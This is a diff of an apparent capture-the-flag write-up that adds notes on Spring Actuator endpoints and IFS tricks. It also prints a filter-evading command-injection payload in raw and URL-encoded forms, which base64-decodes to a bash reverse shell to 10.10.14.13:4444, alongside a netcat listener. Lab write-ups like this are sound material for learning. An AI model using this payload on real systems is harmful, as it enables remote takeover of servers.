@@ -220,7 +220,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK
 ;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
 ```
 
-> URL encode (`CTRL+U`) and send the above payload as the `username` param. 
+> URL encode key chars (`CTRL+U`) and send the above payload as the `username` param. 
 
 ```shell
 nc -lvnp 4444
@@ -500,3 +500,59 @@ uid=0(root) gid=0(root) groups=0(root)
 
 ## New things
 
+1. [`dirsearch`](https://github.com/maurosoria/dirsearch)
+
+2. White Label Error Page
+
+    > _WhiteLabel Error Handling is a simple way to handle errors that is easy to customize. You can change the error pages that are displayed to users, and you can also configure the error code that is displayed and whether or not the stack trace is included._
+
+    <figure>
+        <img src="whitelabel_error_page.png"
+        alt="White label error page" >
+    </figure>
+
+    <figure>
+        <img src="spring_actuators_hacktricks.png"
+        alt="White label error page" >
+    </figure>
+
+    > [Spring Actuators](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
+
+    The Spring Boot Framework includes a number of features called actuators to help you monitor and manage your web application when you push it to production. Intended to be used for auditing, health, and metrics gathering, they can also open a hidden door to your server when misconfigured.
+    
+    When a Spring Boot application is running, it automatically registers several endpoints (such as '/health', '/trace', '/beans', '/env' etc) into the routing process. For Spring Boot 1 - 1.4, they are accessible without authentication, causing significant problems with security. Starting with Spring version 1.5, all endpoints apart from '/health' and '/info' are considered sensitive and secured by default, but this security is often disabled by the application developers.
+    
+    The following Actuator endpoints could potentially have security implications leading to possible vulnerabilities:
+
+    /dump - displays a dump of threads (including a stack trace)
+    /trace - displays the last several HTTP messages (which could include session identifiers)
+    /logfile - outputs the contents of the log file
+    /shutdown - shuts the application down
+    /mappings - shows all of the MVC controller mappings
+    /env - provides access to the configuration environment
+    /restart - restarts the application
+    
+    **For Spring 1x, they are registered under the root URL, and in 2x they moved to the "/actuator/" base path.**
+
+
+3. URL key chars encoding:
+
+    ```shell
+    # 
+    ;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+
+    # URL encoded
+    %3b%65%63%68%6f%24%7b%49%46%53%25%3f%3f%7d%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%79%38%30%4e%44%51%30%49%44%41%2b%4a%6a%45%4b%22%24%7b%49%46%53%25%3f%3f%7d%7c%24%7b%49%46%53%25%3f%3f%7d%62%61%73%65%36%34%24%7b%49%46%53%25%3f%3f%7d%2d%64%24%7b%49%46%53%25%3f%3f%7d%7c%24%7b%49%46%53%25%3f%3f%7d%62%61%73%68%3b%0a
+
+    # URL key chars encoded
+    %3becho${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDQ0IDA%2bJjEK"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
+    ```
+
+4. Internal Field Separator (IFS) variable
+
+- [Bash IFS - What is the Internal Field Separator?](https://delightlylinux.wordpress.com/2020/02/16/bash-ifs-what-is-the-internal-field-separator/)
+- [Linux Shell - What is IFS?](https://www.theunixschool.com/2020/05/linux-shell-what-is-ifs.html)
+
+5. JAR file manipulation
+
+- [How to Open a JAR File Using the Command Line](https://www.makeuseof.com/jar-file-open-using-command-line/)
